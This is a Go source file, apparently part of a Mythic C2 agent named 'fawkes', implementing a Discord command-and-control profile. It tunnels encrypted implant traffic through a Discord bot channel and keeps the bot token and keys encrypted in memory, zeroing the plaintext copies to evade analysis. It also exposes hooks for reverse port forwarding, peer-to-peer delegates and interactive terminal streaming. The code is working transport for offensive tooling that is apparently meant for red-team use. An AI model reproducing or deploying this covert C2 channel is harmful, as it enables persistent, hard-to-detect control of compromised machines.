package discord

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"fawkes/pkg/structs"
)

const (
	discordAPIBase    = "https://discord.com/api/v10"
	maxMessageLength  = 1950 // Discord limit ~2000; server uses 1950 threshold
	defaultPollChecks = 20   // Default number of polling attempts per message exchange
	defaultPollDelay  = 5    // Default seconds between polling attempts
	catchUpPolls      = 3    // Number of catch-up polls after first match (push C2 timing)
	// Discord's API requires a bot-format User-Agent for Bot token auth. Browser-like
	// UAs (e.g. "Mozilla/5.0") return 403/40333. This is hardcoded because Discord
	// enforces the format — operator customization would break API access.
	discordBotUA = "DiscordBot (https://github.com, 1.0)"
)

// MythicMessageWrapper is the envelope used to transport Mythic messages through
// a Discord channel. Both agent and server serialize/deserialize this format.
type MythicMessageWrapper struct {
	Message  string `json:"message"`   // Base64-encoded Mythic message (UUID + encrypted payload)
	SenderID string `json:"sender_id"` // UUID of sender (agent UUID or server UUID)
	ToServer bool   `json:"to_server"` // true = agent→server, false = server→agent
	ClientID string `json:"client_id"` // Tracking ID to correlate request/response
}

// discordMessage represents a Discord API message object (partial).
type discordMessage struct {
	ID          string              `json:"id"`
	Content     string              `json:"content"`
	Attachments []discordAttachment `json:"attachments"`
}

// discordAttachment represents a Discord file attachment.
type discordAttachment struct {
	ID       string `json:"id"`
	Filename string `json:"filename"`
	URL      string `json:"url"`
}

// configVault holds AES-256-GCM encrypted Discord configuration. Sensitive fields
// (bot token, channel ID, encryption key) are stored encrypted and only decrypted
// for the duration of each Discord API operation.
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds Discord C2 fields that should not persist as plaintext.
type sensitiveConfig struct {
	BotToken      string `json:"t"`
	ChannelID     string `json:"c"`
	EncryptionKey string `json:"k"`
	CallbackUUID  string `json:"u"`
}

// DiscordProfile handles communication with Mythic through a Discord channel.
type DiscordProfile struct {
	BotToken      string
	ChannelID     string
	EncryptionKey string
	CallbackUUID  string
	PayloadUUID   string // Stored for matching push C2 messages (Mythic uses payload UUID as TrackingID)
	SleepInterval int
	Jitter        int
	Debug         bool
	MaxRetries    int // message_checks: max polling attempts per exchange
	PollInterval  int // time_between_checks: seconds between polls
	ProxyURL      string

	client   *http.Client
	vault    *configVault
	clientID atomic.Int64 // Monotonic counter for client_id tracking

	// mu protects CallbackUUID updates
	mu sync.Mutex

	// pendingMessages buffers pushed task messages that were accidentally consumed
	// during PostResponse polling. The Discord C2 server sets client_id to the
	// callback UUID for ALL responses (it doesn't echo per-exchange clientIDs),
	// so sendAndPollAll matches both PostResponse acks and pushed tasks
	// indiscriminately. PostResponse extracts its ack and buffers the rest here
	// for GetTasking to drain on the next cycle.
	pendingMu       sync.Mutex
	pendingMessages []string // encrypted Mythic message payloads (base64)

	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks — set by main.go for reverse port forward message routing.
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// NewDiscordProfile creates a new Discord C2 profile.
func NewDiscordProfile(botToken, channelID, encryptionKey string, sleepInterval, jitter, maxRetries, pollInterval int, debug bool, proxyURL string) *DiscordProfile {
	if maxRetries <= 0 {
		maxRetries = defaultPollChecks
	}
	if pollInterval <= 0 {
		pollInterval = defaultPollDelay
	}

	transport := &http.Transport{
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}
	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	profile := &DiscordProfile{
		BotToken:      botToken,
		ChannelID:     channelID,
		EncryptionKey: encryptionKey,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		MaxRetries:    maxRetries,
		PollInterval:  pollInterval,
		ProxyURL:      proxyURL,
		client: &http.Client{
			Timeout:   30 * time.Second,
			Transport: transport,
		},
	}
	return profile
}

// SealConfig encrypts all sensitive Discord configuration fields into an AES-256-GCM
// vault and zeros the plaintext struct fields.
func (d *DiscordProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		BotToken:      d.BotToken,
		ChannelID:     d.ChannelID,
		EncryptionKey: d.EncryptionKey,
		CallbackUUID:  d.CallbackUUID,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		zeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	zeroBytes(plaintext)
	if blob == nil {
		zeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	d.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields
	d.BotToken = ""
	d.ChannelID = ""
	d.EncryptionKey = ""
	d.CallbackUUID = ""

	return nil
}

// getConfig returns the current Discord configuration. If the vault is active,
// decrypts and returns the config. Otherwise returns plaintext struct fields.
func (d *DiscordProfile) getConfig() *sensitiveConfig {
	if d.vault == nil {
		return &sensitiveConfig{
			BotToken:      d.BotToken,
			ChannelID:     d.ChannelID,
			EncryptionKey: d.EncryptionKey,
			CallbackUUID:  d.CallbackUUID,
		}
	}

	plaintext := vaultDecrypt(d.vault.key, d.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		zeroBytes(plaintext)
		return nil
	}
	zeroBytes(plaintext)
	return &cfg
}

// UpdateCallbackUUID updates the callback UUID in the vault (or struct field).
func (d *DiscordProfile) UpdateCallbackUUID(uuid string) {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.vault != nil {
		cfg := d.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(d.vault.key, plaintext)
				zeroBytes(plaintext)
				if newBlob != nil {
					zeroBytes(d.vault.blob)
					d.vault.blob = newBlob
				}
			}
		}
		return
	}
	d.CallbackUUID = uuid
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
func (d *DiscordProfile) GetCallbackUUID() string {
	d.mu.Lock()
	defer d.mu.Unlock()

	if d.vault != nil {
		if cfg := d.getConfig(); cfg != nil {
			return cfg.CallbackUUID
		}
	}
	return d.CallbackUUID
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
func (d *DiscordProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg != nil && cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	d.mu.Lock()
	cu := d.CallbackUUID
	d.mu.Unlock()
	if cu != "" {
		return cu
	}
	return agent.PayloadUUID
}

// nextClientID returns a unique tracking ID for correlating request/response pairs.
func (d *DiscordProfile) nextClientID() string {
	return strconv.FormatInt(d.clientID.Add(1), 10)
}
